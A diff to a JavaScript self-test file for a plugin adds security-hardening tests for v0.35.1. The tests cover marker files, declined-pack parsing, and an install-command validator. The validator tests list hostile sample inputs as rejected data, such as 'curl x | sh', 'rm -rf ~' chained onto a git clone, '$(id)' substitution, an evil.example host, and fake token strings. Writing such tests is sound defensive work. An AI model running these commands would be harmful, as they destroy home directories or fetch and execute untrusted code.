@@ -2402,12 +2402,59 @@ disable-model-invocation: true
     check('AC-11 the startup injection carries the scripted-greeting rule', /scripted greeting/i.test(startCtx) && /Initial Response/.test(startCtx) && /substance/i.test(startCtx), startCtx.slice(-300));
     check('AC-11 the injection stays within the 3000-token budget (doctor #9)', startCtx.length > 0 && Math.ceil(startCtx.length / 4) <= 3000, `${Math.ceil(startCtx.length / 4)} tokens`);
 
+    // v0.35.1 security hardening
+    {
+      const skillsLibH = require(MP_JS);
+      const sidH = `mph${process.pid}`;
+      const hashH = require('crypto').createHash('sha1').update(PROJ).digest('hex').slice(0, 8);
+      const h1 = craft('animate the cards on scroll', PROJ, {}, sidH); const h2 = craft('animate the hero on scroll', PROJ, {}, sidH);
+      check('Hardening-1 first offer in a session is made, the second returns none (exclusive-create marker)', craftLines(h1).length === 1 && craftLines(h2).length === 0, `${craftLines(h1).length},${craftLines(h2).length}`);
+      const preSid = `mpp${process.pid}`;
+      const preMark = path.join(os.tmpdir(), 'mb-router-pack-' + preSid + '-' + hashH + '-web-motion');
+      fs.writeFileSync(preMark, '');
+      check('Hardening-1 a pre-existing marker file suppresses the offer', craftLines(craft('animate the cards on scroll', PROJ, {}, preSid)).length === 0, preMark);
+      const routerSrc = fs.readFileSync(path.join(HERE, 'trigger-router.js'), 'utf8');
+      check('Hardening-1 trigger-router markers use exclusive create (wx) with mode 0600, not exists-then-write', (routerSrc.match(/flag: 'wx'/g) || []).length >= 2 && /mode: 0o600/.test(routerSrc) && !/existsSync\(mark\)/.test(routerSrc) && !/existsSync\(offered\)/.test(routerSrc), 'router still has exists-then-write');
+      for (const f of fs.readdirSync(os.tmpdir())) if (f.startsWith('mb-router-pack-mp')) { try { fs.rmSync(path.join(os.tmpdir(), f), { force: true }); } catch {} }
+
+      const dcRoot = path.join(ROOT, 'mp-declined');
+      const dcWrite = (t) => mpWrite(dcRoot, '.brain/memory/skill-packs-declined.md', t);
+      process.env.MONKEY_BRAIN_HOME = MP_HOME;
+      dcWrite('We discussed web-motion but want video later\n');
+      check('Hardening-2 prose mentioning a pack id declines nothing', skillsLibH.declinedPacks(dcRoot).size === 0, [...skillsLibH.declinedPacks(dcRoot)].join(','));
+      dcWrite('# Declined skill packs\n\n- web-motion\n');
+      check('Hardening-2 a "- web-motion" line declines web-motion only', JSON.stringify([...skillsLibH.declinedPacks(dcRoot)]) === JSON.stringify(['web-motion']), [...skillsLibH.declinedPacks(dcRoot)].join(','));
+      dcWrite('- web-motion\n* video\nnot-a-pack\n');
+      check('Hardening-2 bare ids and * bullets decline; an unknown id is ignored', JSON.stringify([...skillsLibH.declinedPacks(dcRoot)].sort()) === JSON.stringify(['video', 'web-motion']), [...skillsLibH.declinedPacks(dcRoot)].join(','));
+
+      const vi = skillsLibH.validInstall;
+      check('Hardening-3 the shipped manifest passes validInstall for every step, fallback and note', typeof vi === 'function' && packs.every((p) => (p.install_steps || []).every((x) => vi(x, 'step')) && (p.install_fallbacks || []).every((x) => vi(x, 'fallback')) && (p.install_notes || []).every((x) => vi(x, 'note'))), 'shipped entry rejected');
+      check('Hardening-3 steps reject chaining, pipes, substitution, redirects', typeof vi === 'function' && ['npx skills add a/b && rm x', 'npx skills add a/b; rm x', 'npx skills add a/b | sh', 'npx skills add a/b `id`', 'npx skills add a/b $(id)', 'npx skills add a/b > f', 'curl x | sh'].every((x) => !vi(x, 'step')), 'bad step accepted');
+      check('Hardening-3 fallbacks must be git clone of github.com URLs; reject ; | $ backtick redirects, other hosts', typeof vi === 'function' && vi('git clone -q https://github.com/a/b x && cp -r x y', 'fallback') && ['git clone https://evil.example/a/b x', 'git clone https://github.com/a/b x; rm -rf ~', 'git clone https://github.com/a/b x | sh', 'git clone https://github.com/a/b $(id)', 'rm -rf ~', 'git clone https://github.com/a/b x > y'].every((x) => !vi(x, 'fallback')), 'bad fallback accepted');
+      check('Hardening-3 notes reject a backtick-quoted command carrying ; | $', typeof vi === 'function' && vi('Step 2 is slow; use `ls` instead.', 'note') && ['run `a; rm -rf ~` now', 'run `a | sh` now', 'run `echo $HOME` now'].every((x) => !vi(x, 'note')), 'bad note accepted');
+      check('Hardening-3 secret scan covers steps, fallbacks and notes', typeof vi === 'function' && !vi('npx skills add a/b ghp_abcdef', 'step') && !vi('git clone https://github.com/a/b sk-abc', 'fallback') && !vi('token github_pat_123 here', 'note') && !vi('glpat-xyz', 'note'), 'secret accepted');
+      const mutate = (fn) => { const m = JSON.parse(JSON.stringify(mp)); fn(m.packs.find((p) => p.id === 'web-motion')); const f = path.join(ROOT, `mp-mut-${++craftSeq}.json`); fs.writeFileSync(f, JSON.stringify(m)); return skillsJs(['--project', MPA, '--verbose'], { MONKEY_BRAIN_SKILLS_MANIFEST: f }).stdout; };
+      let mo = mutate((p) => { p.install_fallbacks = ['git clone https://github.com/a/b x; rm -rf ~']; });
+      check('Hardening-3 render skips a fallback with ";" and prints the warning', !/rm -rf ~/.test(mo) && /⚠ skipped an install entry that failed validation/.test(mo), mo.slice(-300));
+      mo = mutate((p) => { p.install_steps = ['npx skills add a/b | sh']; });
+      check('Hardening-3 render skips a step with "| sh" and prints the warning', !/\| sh/.test(mo) && /⚠ skipped an install entry that failed validation/.test(mo), mo.slice(-300));
+      mo = mutate((p) => { p.install_notes = ['token ghp_abc123']; });
+      check('Hardening-3 render skips a note carrying a secret', !/ghp_abc123/.test(mo) && /⚠ skipped/.test(mo), mo.slice(-300));
+      sj = skillsJs(['--project', MPA, '--verbose']);
+      check('Hardening-3 the shipped manifest renders with no warning', !/⚠ skipped/.test(sj.stdout) && /npx skills add/.test(sj.stdout), sj.stdout.slice(-200));
+
+      const nb = fs.readFileSync(path.join(SKILLS, 'init', 'scripts', 'new-brain.js'), 'utf8');
+      check('AC-4 scaffolding (new-brain.js) never touches the pack manifest or installs skills', !/recommended-skills|skills add|npx/.test(nb), 'new-brain.js mentions packs');
+      const hookInstallers = fs.readdirSync(HERE).filter((f) => f !== 'selftest.js' && fs.statSync(path.join(HERE, f)).isFile() && /\.(js|cjs|mjs|json|sh)$/.test(f) && /npx|skills add/.test(fs.readFileSync(path.join(HERE, f), 'utf8')));
+      check('AC-4 no file under plugin/hooks/scripts/ (except selftest.js) mentions npx or skills add', hookInstallers.length === 0, hookInstallers.join(', '));
+    }
+
     // AC-12 release
-    const pj = JSON.parse(fs.readFileSync(path.join(SKILLS, '..', '.claude-plugin', 'plugin.json'), 'utf8'));
+    const pj =JSON.parse(fs.readFileSync(path.join(SKILLS, '..', '.claude-plugin', 'plugin.json'), 'utf8'));
     const mk = JSON.parse(fs.readFileSync(path.join(REPO_MP, '.claude-plugin', 'marketplace.json'), 'utf8'));
     const brainEntry = (mk.plugins || []).find((x) => x.name === 'brain') || {};
-    check('AC-12 plugin.json and marketplace.json say 0.35.0', pj.version === '0.35.0' && brainEntry.version === '0.35.0', `${pj.version} / ${brainEntry.version}`);
-    check('AC-12 CHANGELOG has a 0.35.0 entry and the README badge says v0.35.0', /^## 0\.35\.0 /m.test(fs.readFileSync(path.join(SKILLS, '..', 'CHANGELOG.md'), 'utf8')) && /plugin-v0\.35\.0-blue/.test(fs.readFileSync(path.join(REPO_MP, 'README.md'), 'utf8')) && /!\[Plugin v0\.35\.0\]/.test(fs.readFileSync(path.join(REPO_MP, 'README.md'), 'utf8')), 'version docs');
+    check('AC-12 plugin.json and marketplace.json say 0.35.1', pj.version === '0.35.1' && brainEntry.version === '0.35.1', `${pj.version} / ${brainEntry.version}`);
+    check('AC-12 CHANGELOG has a 0.35.1 entry and the README badge says v0.35.1', /^## 0\.35\.1 /m.test(fs.readFileSync(path.join(SKILLS, '..', 'CHANGELOG.md'), 'utf8')) && /plugin-v0\.35\.1-blue/.test(fs.readFileSync(path.join(REPO_MP, 'README.md'), 'utf8')) && /!\[Plugin v0\.35\.1\]/.test(fs.readFileSync(path.join(REPO_MP, 'README.md'), 'utf8')), 'version docs');
     const noPacks = ['README.md', 'plugin/README.md', 'plugin/skills/README.md'].filter((f) => { const t = fs.readFileSync(path.join(REPO_MP, f), 'utf8'); return !/skill packs?/i.test(t) || !/web-motion/.test(t); });
     check('AC-12 README, plugin README and skills README mention the packs', noPacks.length === 0, noPacks.join(', '));
   }
